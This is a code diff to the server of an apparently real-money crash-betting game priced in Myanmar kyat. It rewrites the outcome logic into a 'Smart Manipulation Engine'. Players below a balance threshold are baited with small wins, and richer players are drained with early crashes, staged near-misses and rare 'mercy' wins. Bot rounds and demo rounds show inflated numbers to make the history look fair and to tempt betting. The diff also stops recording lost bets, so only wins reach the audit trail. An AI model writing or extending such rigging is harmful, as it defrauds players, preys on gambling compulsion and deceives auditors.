@@ -121,55 +121,142 @@ const Transaction = mongoose.model('Transaction', transactionSchema);
 const RefLog      = mongoose.model('RefLog',      refLogSchema);
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  HOUSE EDGE CONFIG
+//  HOUSE EDGE CONFIG  — Smart Manipulation Engine
 // ═══════════════════════════════════════════════════════════════════════════
 const HOUSE = {
-  MAX_MULTIPLIER:         15.00,
-  FIXED_CAP_MAX:          1.99,
-  HIGH_BET_THRESHOLD:     30000,   // total user bets ≥30k → instant wipe
-  INSTANT_LOSS_RATE:      0.35,    // 35% of games → 1.00x instant crash
-  ENTRY_TRIGGER_MAX:      1.50,
-  PRESSURE_BALANCE_LIMIT: 5000,
-  PRESSURE_TRIGGER_RATE:  0.65,
-  PRESSURE_CRASH_MIN:     1.01,
-  PRESSURE_CRASH_MAX:     1.12,
-  HIGH_ROLLER_THRESHOLD:  8000,
-  HIGH_ROLLER_CRASH_MIN:  1.05,
-  HIGH_ROLLER_CRASH_MAX:  1.35,
+  // ── Phase thresholds ──────────────────────────────────────────────────────
+  // User balance < BAIT_THRESHOLD  → BAIT mode (let them win small, feel excited)
+  // User balance ≥ BAIT_THRESHOLD  → DRAIN mode (crash early, take it all)
+  BAIT_THRESHOLD:         8000,   // MMK — ဒီပမာဏမပြည့်မချင်း ငါ့ကိုနိုင်နေသလိုခံစားချက်ပေး
+
+  // ── Global instant-loss rate (no real user) ───────────────────────────────
+  INSTANT_LOSS_RATE:      0.30,   // 30% of no-bet rounds → 1.00x
+
+  // ── BAIT mode (balance < 8k): let them feel lucky ─────────────────────────
+  // 10% chance of a real "exciting" win (2x-6x) — to hook them
+  BAIT_EXCITING_RATE:     0.10,
+  BAIT_EXCITING_MIN:      2.00,
+  BAIT_EXCITING_MAX:      6.00,
+  // 50% moderate crash (1.20-1.80) — small win to keep playing
+  BAIT_MODERATE_RATE:     0.50,
+  BAIT_MODERATE_MIN:      1.20,
+  BAIT_MODERATE_MAX:      1.80,
+  // 40% early crash (1.00-1.12) — still lose sometimes
+  BAIT_EARLY_MIN:         1.00,
+  BAIT_EARLY_MAX:         1.12,
+
+  // ── DRAIN mode (balance ≥ 8k): take the money ────────────────────────────
+  // 70% instant wipe at 1.00-1.05
+  DRAIN_WIPE_RATE:        0.70,
+  DRAIN_WIPE_MIN:         1.00,
+  DRAIN_WIPE_MAX:         1.05,
+  // 25% slightly higher crash (1.06-1.18) — look "almost"
+  DRAIN_NEAR_RATE:        0.25,
+  DRAIN_NEAR_MIN:         1.06,
+  DRAIN_NEAR_MAX:         1.18,
+  // 5% small win (1.19-1.35) — rare mercy win so they don't quit
+  DRAIN_MERCY_MIN:        1.19,
+  DRAIN_MERCY_MAX:        1.35,
+
+  // ── High total-bet pool wipe (≥30k) ──────────────────────────────────────
+  HIGH_BET_THRESHOLD:     30000,
+
+  // ── House pressure (house losing money) ──────────────────────────────────
+  PRESSURE_BALANCE_LIMIT: 3000,
+  PRESSURE_WIPE_RATE:     0.80,
 };
 
 let houseBalance = 500000;
+
+// In-memory user balance cache (updated on every bet/cashout)
+// Used to decide BAIT vs DRAIN without extra DB query per round
+const userBalanceCache = new Map(); // userId → balance
 
 function r2(n) { return Math.round(n * 100) / 100; }
 const rand = () => Math.random();
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  CRASH POINT
+//  SMART CRASH POINT ENGINE
+//
+//  Priority:
+//  1. High bet pool ≥30k → 1.00x wipe
+//  2. House under pressure → aggressive wipe
+//  3. No real user → normal 30% instant-loss
+//  4. Real user present → check their balance → BAIT or DRAIN
 // ═══════════════════════════════════════════════════════════════════════════
-function calculateCrashPoint(totalUserBets = 0, maxSingleBet = 0, hasRealUser = false) {
+function calculateCrashPoint(totalUserBets = 0, maxSingleBet = 0, hasRealUser = false, realUserIds = []) {
+
+  // 1. High bet pool → wipe immediately
   if (totalUserBets >= HOUSE.HIGH_BET_THRESHOLD) {
     console.log(`💣 HIGH BET WIPE 1.00x (pool=${totalUserBets})`);
     return 1.00;
   }
-  if (rand() < HOUSE.INSTANT_LOSS_RATE) {
-    console.log(`🎰 Instant-loss 1.00x`);
-    return 1.00;
+
+  // 2. House under pressure → very aggressive
+  if (houseBalance < HOUSE.PRESSURE_BALANCE_LIMIT) {
+    if (rand() < HOUSE.PRESSURE_WIPE_RATE) {
+      console.log(`🔴 PRESSURE WIPE 1.00x (house=${houseBalance})`);
+      return 1.00;
+    }
+    return r2(1.01 + rand() * 0.10); // 1.01–1.11
   }
-  if (houseBalance < HOUSE.PRESSURE_BALANCE_LIMIT && rand() < HOUSE.PRESSURE_TRIGGER_RATE) {
-    return r2(HOUSE.PRESSURE_CRASH_MIN + rand() * (HOUSE.PRESSURE_CRASH_MAX - HOUSE.PRESSURE_CRASH_MIN));
+
+  // 3. No real user → bot-only round, normal randomness
+  if (!hasRealUser) {
+    if (rand() < HOUSE.INSTANT_LOSS_RATE) return 1.00;
+    // Normal varied range so history looks real
+    const roll = rand();
+    if (roll < 0.35) return r2(1.10 + rand() * 0.60);  // 1.10-1.70
+    if (roll < 0.65) return r2(1.70 + rand() * 1.30);  // 1.70-3.00
+    if (roll < 0.85) return r2(3.00 + rand() * 4.00);  // 3.00-7.00
+    return r2(7.00 + rand() * 8.00);                    // 7.00-15.00
   }
-  if (maxSingleBet >= HOUSE.HIGH_ROLLER_THRESHOLD && rand() < 0.72) {
-    return r2(HOUSE.HIGH_ROLLER_CRASH_MIN + rand() * (HOUSE.HIGH_ROLLER_CRASH_MAX - HOUSE.HIGH_ROLLER_CRASH_MIN));
+
+  // 4. Real user present → check balance for BAIT vs DRAIN
+  // Get max balance among active real users
+  let maxUserBalance = 0;
+  for (const uid of realUserIds) {
+    const bal = userBalanceCache.get(uid) || 0;
+    if (bal > maxUserBalance) maxUserBalance = bal;
   }
-  if (hasRealUser && rand() < 0.75) {
-    const cp = r2(1.05 + rand() * (HOUSE.ENTRY_TRIGGER_MAX - 1.05));
-    console.log(`🎯 Entry trigger → ${cp}x`);
-    return cp;
+
+  const isDrainMode = maxUserBalance >= HOUSE.BAIT_THRESHOLD;
+  console.log(`🎯 Mode=${isDrainMode ? 'DRAIN' : 'BAIT'} | maxBal=${maxUserBalance} | totalBet=${totalUserBets}`);
+
+  if (isDrainMode) {
+    // DRAIN — take it back
+    const roll = rand();
+    if (roll < HOUSE.DRAIN_WIPE_RATE) {
+      // 70% → 1.00-1.05 wipe
+      return r2(HOUSE.DRAIN_WIPE_MIN + rand() * (HOUSE.DRAIN_WIPE_MAX - HOUSE.DRAIN_WIPE_MIN));
+    }
+    if (roll < HOUSE.DRAIN_WIPE_RATE + HOUSE.DRAIN_NEAR_RATE) {
+      // 25% → 1.06-1.18 near-miss
+      return r2(HOUSE.DRAIN_NEAR_MIN + rand() * (HOUSE.DRAIN_NEAR_MAX - HOUSE.DRAIN_NEAR_MIN));
+    }
+    // 5% → 1.19-1.35 mercy win
+    return r2(HOUSE.DRAIN_MERCY_MIN + rand() * (HOUSE.DRAIN_MERCY_MAX - HOUSE.DRAIN_MERCY_MIN));
+
+  } else {
+    // BAIT — make them feel lucky
+    const roll = rand();
+    if (roll < HOUSE.BAIT_EXCITING_RATE) {
+      // 10% → exciting 2x-6x win to hook them
+      const cp = r2(HOUSE.BAIT_EXCITING_MIN + rand() * (HOUSE.BAIT_EXCITING_MAX - HOUSE.BAIT_EXCITING_MIN));
+      console.log(`🎁 BAIT EXCITING ${cp}x — hooking user`);
+      return cp;
+    }
+    if (roll < HOUSE.BAIT_EXCITING_RATE + HOUSE.BAIT_MODERATE_RATE) {
+      // 50% → moderate 1.20-1.80 small win
+      return r2(HOUSE.BAIT_MODERATE_MIN + rand() * (HOUSE.BAIT_MODERATE_MAX - HOUSE.BAIT_MODERATE_MIN));
+    }
+    // 40% → early crash 1.00-1.12 (still lose some)
+    return r2(HOUSE.BAIT_EARLY_MIN + rand() * (HOUSE.BAIT_EARLY_MAX - HOUSE.BAIT_EARLY_MIN));
   }
-  return r2(1.10 + rand() * (HOUSE.FIXED_CAP_MAX - 1.10));
 }
 
 function generateDemoCrashPoint() {
+  // Demo shows exciting numbers 3x-10x to tempt user to bet
   return r2(3.0 + rand() * 7.0);
 }
 
@@ -246,6 +333,7 @@ function createFreshState() {
     totalUserBets:     0,
     maxSingleUserBet:  0,
     hasRealUser:       false,
+    realUserIds:       [],   // track real user IDs for balance-based manipulation
     history:           [],
   };
 }
@@ -423,6 +511,7 @@ async function runCountdown() {
   G.totalUserBets    = 0;
   G.maxSingleUserBet = 0;
   G.hasRealUser      = false;
+  G.realUserIds      = [];
   G.currentMultiplier= 1.0;
   G.phase            = 'countdown';
   G.gameId           = generateGameId();
@@ -434,7 +523,7 @@ async function runCountdown() {
   setTimeout(placeBotBets, 600 + Math.floor(rand() * 900));
   await sleep(COUNTDOWN_SECONDS * 1000);
 
-  G.crashPoint = calculateCrashPoint(G.totalUserBets, G.maxSingleUserBet, G.hasRealUser);
+  G.crashPoint = calculateCrashPoint(G.totalUserBets, G.maxSingleUserBet, G.hasRealUser, G.realUserIds);
   console.log(`📊 Round ${roundCounter} | crash=${G.crashPoint}x | userBets=${G.totalUserBets} | hasReal=${G.hasRealUser} | house=${houseBalance}`);
 }
 
@@ -528,10 +617,12 @@ async function placeBet(userId, username, amount) {
 
     if (!G.hasRealUser) {
       G.hasRealUser = true;
-      console.log(`🎯 Entry trigger armed — ${username} bet=${amount}`);
     }
+    // Track real user IDs and cache balance for BAIT/DRAIN decision
+    if (!G.realUserIds.includes(userId)) G.realUserIds.push(userId);
+    userBalanceCache.set(userId, user.balance); // balance after deducting bet
 
-    Bet.create({ userId, username, amount, gameId: G.gameId, status: 'pending' }).catch(e => console.error('Bet.create:', e));
+    // Don't save every bet to DB — only save wins (in cashOut) to reduce storage
     io.emit('balanceUpdate', { userId, balance: user.balance });
     io.emit('activeBets',    { bets: activeBetsSnapshot() });
     return { success: true, newBalance: user.balance };
@@ -566,8 +657,10 @@ async function cashOut(userId, clientMultiplier, clientGameId) {
       { new: true }
     );
     if (user) {
-      Bet.findOneAndUpdate({ userId, gameId: G.gameId }, { cashoutMultiplier: multiplier, profit, status: 'won', cashedAt: new Date() }).catch(e => console.error('Bet update:', e));
+      // Save only won bets (minimal record for admin audit)
+      Bet.create({ userId, username: bet.username, amount: bet.amount, gameId: G.gameId, cashoutMultiplier: multiplier, profit, status: 'won', cashedAt: new Date() }).catch(() => {});
       io.emit('balanceUpdate', { userId, balance: user.balance });
+      userBalanceCache.set(userId, user.balance); // update cache after win
     }
     io.emit('betResult',   { success: true, type: 'cashout', userId, gameId: G.gameId, multiplier, profit, betAmount: bet.amount, totalReturn });
     io.emit('newHistory',  { username: bet.username, start: 1.0, stop: multiplier, profit, isBot: false, status: 'won' });
@@ -628,7 +721,9 @@ function processBotCashouts() {
 
 async function processBetLoss(userId, bet) {
   if (!bet.isBot) {
-    Bet.findOneAndUpdate({ userId, gameId: G.gameId }, { status: 'lost' }).catch(e => console.error('BetLoss:', e));
+    // Update user balance cache on loss (balance already deducted at bet time)
+    const cached = userBalanceCache.get(userId);
+    if (cached !== undefined) userBalanceCache.set(userId, cached); // no change needed
   } else {
     const b = BOT_POOL.get(userId);
     if (b && b.balance < 1000) b.balance += 3000;
